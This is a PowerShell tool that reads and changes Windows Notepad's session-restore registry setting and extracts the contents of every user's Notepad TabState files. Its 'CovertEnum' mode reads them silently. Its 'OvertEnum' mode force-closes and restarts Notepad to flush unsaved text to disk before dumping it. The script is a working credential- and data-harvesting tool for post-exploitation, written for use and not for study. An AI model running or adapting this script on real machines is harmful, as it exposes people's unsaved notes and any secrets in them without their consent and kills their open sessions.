param (
    [switch]$CheckRestore,
    [switch]$EnableRestore,
    [switch]$DisableRestore,
    [switch]$CheckProcess,
    [switch]$CovertEnum,
    [switch]$OvertEnum
)

# NotePad Registry path and key
$regPath = "HKCU:\Software\Microsoft\Notepad"
$keyName = "RestoreWindows"

# Notepad restore session Tabstate path 
$folderPath = "C:\Users\*\AppData\Local\Packages\Microsoft.WindowsNotepad_*\LocalState\TabState\*.bin"  

# Enumerate Session restore functionality on local host 
function Get-NotepadRestore {
    try {
        $value = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction Stop
        switch ($value.$keyName) {
            1 { Write-Output "Notepad session restore is ENABLED." }
            0 { Write-Output "Notepad session restore is DISABLED." }
            default { Write-Output "Notepad session restore has an UNKNOWN value: $($value.$keyName)" }
        }
    } catch {
        Write-Output "Notepad session restore setting not found. Default behavior is ENABLED."
    }
}

#change Notepad Session restore functionality 
function Set-NotepadRestore($state) {
    try {
        Set-ItemProperty -Path $regPath -Name $keyName -Value $state -Type DWord
        if ($state -eq 1) {
            Write-Output "Notepad session restore has been ENABLED."
        } else {
            Write-Output "Notepad session restore has been DISABLED."
        }
    } catch {
        Write-Output "Failed to set Notepad session restore state: $_"
    }
}

# Enumerate any running notepadd processes locally 
function Get-NotepadProcess {
    $processes = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
    if ($processes) {
        Write-Output "Notepad process IS RUNNING."
    } else {
        Write-Output "Notepad process is NOT running."
    }
}

# Extract Session restore files covertly , without a notepad shutdown and restart
function Show-CovertFilesContent {
    $files = Get-ChildItem -Path $folderPath -File -ErrorAction SilentlyContinue
    if (-not $files) {
        Write-Output "No matching files found in path: $folderPath"
        return
    }

    foreach ($file in $files) {
        Write-Output "`n==== Contents of: $($file.FullName) ===="
        try {
            Get-Content $file.FullName -ErrorAction Stop | ForEach-Object { Write-Output $_ }
        } catch {
            Write-Output "Could not read file: $($file.FullName). Error: $_"
        }
        Write-Output "`n==================== END ====================`n"
    }
}

# Extract Session restore files, shutsdown noteapd sessions and restarts them inorder to force session restore functinality and output notepad data 
function Show-OvertFilesContent {
    Write-Output "Closing all Notepad processes..."

    $notepads = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
    if ($notepads) {
        $notepads | ForEach-Object {
            try {
                $_.CloseMainWindow() | Out-Null
                Start-Sleep -Milliseconds 500
                if (!($_.HasExited)) {
                    $_.Kill()
                }
            } catch {
                Write-Output "Could not close a Notepad process: $_"
            }
        }

        Start-Sleep -Seconds 1
        Write-Output "All Notepad processes closed."
    } else {
        Write-Output "No Notepad processes were running."
    }

    # Start a new instance of Notepad
    try {
        Start-Process "notepad.exe"
        Write-Output "A new Notepad instance has been started."
    } catch {
        Write-Output "Failed to start Notepad: $_"
        return
    }

    # Output file contents using same formatting as Show-CovertFilesContent
    $files = Get-ChildItem -Path $folderPath -File -ErrorAction SilentlyContinue
    if (-not $files) {
        Write-Output "`nNo matching files found in path: $folderPath"
        return
    }

    foreach ($file in $files) {
        Write-Output "`n==== Contents of: $($file.FullName) ===="
        try {
            Get-Content $file.FullName -ErrorAction Stop | ForEach-Object { Write-Output $_ }
        } catch {
            Write-Output "Could not read file: $($file.FullName). Error: $_"
        }
        Write-Output "`n==================== END ====================`n"
    }
}

# Handle command-line arguments
if ($CheckRestore) { Get-NotepadRestore }
if ($EnableRestore) { Set-NotepadRestore -state 1 }
if ($DisableRestore) { Set-NotepadRestore -state 0 }
if ($CheckProcess) { Get-NotepadProcess }
if ($CovertEnum) { Show-CovertFilesContent }
if ($OvertEnum) { Show-OvertFilesContent }

# Show help if no arguments are provided
if (-not ($CheckRestore -or $EnableRestore -or $DisableRestore -or $CheckProcess -or $CovertEnum -or $OvertEnum)) {
    Write-Output "Usage: .\NotepadRestoreControl.ps1 [-CheckRestore] [-EnableRestore] [-DisableRestore] [-CheckProcess] [-CovertEnum] [-OvertEnum]
    -CheckRestore     -   Check NotePad restore settings
    -EnableRestore    -   Enable NotePad session restore
    -DisableRestore   -   Disable NotePad session restore
    -CheckProcess     -   Check for running NotePad processes
    -CovertEnum       -   Covert Enumeration of vulnerable NotePad session restore files 
    -OvertEnum        -   Overt Enumeration of vulnerable NotePad session restore files , closes and reopens any NotePad processes
    "
}
